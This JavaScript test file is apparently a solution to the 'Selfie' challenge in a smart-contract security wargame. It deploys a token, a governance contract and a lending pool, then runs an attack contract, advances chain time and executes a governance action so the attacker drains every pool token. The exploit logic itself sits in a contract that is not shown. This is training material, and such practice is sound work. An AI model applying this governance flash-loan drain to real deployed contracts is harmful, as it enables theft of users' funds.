const { ether, time } = require('@openzeppelin/test-helpers');
const { accounts, contract } = require('@openzeppelin/test-environment');
const { expect } = require('chai');

describe("[Challenge] Selfie", function () {
  // Ethereum balances
  const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther("2000000")
  const TOKENS_IN_POOL = ethers.utils.parseEther("1500000");

  // Declare variables
  let ContractFactoryA;
  let ContractFactoryB;
  let ContractFactoryC;
  let ContractFactoryD;

  let token;
  let governance;
  let pool;
  let attackContract;

  let deployer;
  let attacker;
  let otherAccounts;
  
  before(async function () {
    //Setup accounts and contracts
    [deployer, attacker, ...otherAccounts] = await ethers.getSigners();

    ContractFactoryA = await ethers.getContractFactory("DamnValuableTokenSnapshot");
    ContractFactoryB = await ethers.getContractFactory("SimpleGovernance");
    ContractFactoryC = await ethers.getContractFactory("SelfiePool");
 
    token = await ContractFactoryA.deploy(TOKEN_INITIAL_SUPPLY);
    governance = await ContractFactoryB.deploy(token.address);
    pool = await ContractFactoryC.deploy(token.address, governance.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
  })

  it("Exploit", async function() {
    ContractFactoryD = await ethers.getContractFactory("Challenge6Attack");
    attackContract = await ContractFactoryD.deploy(token.address, governance.address, pool.address, attacker.address);
    await attackContract.connect(attacker).attack(TOKENS_IN_POOL);
    await network.provider.send("evm_increaseTime", [172800]);
    await network.provider.send("evm_mine");
    await governance.connect(attacker).executeAction(1);
  })

  after(async function () {
    expect(await token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await token.balanceOf(pool.address)).to.equal(0);
  })
})
